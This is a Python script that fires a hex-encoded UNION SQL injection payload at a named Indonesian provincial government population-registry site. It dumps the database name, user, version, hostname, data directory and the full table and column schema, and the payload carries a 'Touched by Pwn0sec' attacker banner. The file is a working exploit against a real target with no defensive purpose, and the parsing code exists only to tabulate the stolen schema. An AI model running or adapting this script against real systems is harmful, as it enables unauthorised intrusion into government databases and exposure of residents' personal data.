import requests
from bs4 import BeautifulSoup
from prettytable import PrettyTable

# URL hasil SQL injection
url = "https://dispermadesdukcapil.jatengprov.go.id/e-ppid/index.php/data/kategori/?id=6%27%20union%20select%201,concat(0x2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d,0x3c62723e,0x3c62723e,0x546F75636865642062792050776E30736563202D2040696D68756E746572616E64,0x3c62723e,0x3c62723e,0x2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d,0x3c62723e,0x3c62723e,%200x4461746162617365203a3a20,database(),%200x3c62723e,0x55736572203a3a20,user(),0x3c62723e,0x56657273696f6e203a3a20,version(),0x3c62723e,%200x486f73746e616d65203a3a20,@@hostname,%200x3c62723e,0x4461746120646972203a3a20,@@datadir,0x3c62723e,0x3c62723e,(select(@a)+from+(select(@a:=0x00),(@tbl:=0x00),(select+(@a)+from+(information_schema.columns)+where+(table_schema!=0x696e666f726d6174696f6e5f736368656d61)+and(0x00)in+(@a:=concat(@a,0x3c62723e,if(+(@tbl!=table_name),Concat(0x3c62723e,0x5461626c65203a3a20,@tbl:=table_name,0x3c62723e7e20,column_name),concat(0x7e20,(column_name)))))))a)),3,4,5,6,7--%20-"

# Request ke URL
response = requests.get(url)
response.raise_for_status()

# Parsing HTML dengan BeautifulSoup
soup = BeautifulSoup(response.text, "html.parser")

# Ekstrak tabel dari output
text = soup.get_text()

# Memisahkan tabel berdasarkan keyword "Table ::"
sections = text.split("Table ::")
metadata = sections[0].strip()

# Menampilkan metadata (database info)
metadata_table = PrettyTable()
metadata_table.field_names = ["Property", "Value"]

for line in metadata.splitlines():
    if "::" in line:
        key, value = line.split("::", 1)
        metadata_table.add_row([key.strip(), value.strip()])

print("\n=== Database Metadata ===")
print(metadata_table)

# Menampilkan tabel database
for section in sections[1:]:
    lines = section.strip().split("~")
    table_name = lines[0].strip()
    columns = [col.strip() for col in lines[1:] if col.strip()]

    # Membuat tabel PrettyTable
    table = PrettyTable()
    table.field_names = ["Column Index", "Column Name"]

    for idx, col in enumerate(columns, start=1):
        table.add_row([idx, col])

    print(f"\n=== Table: {table_name} ===")
    print(table)
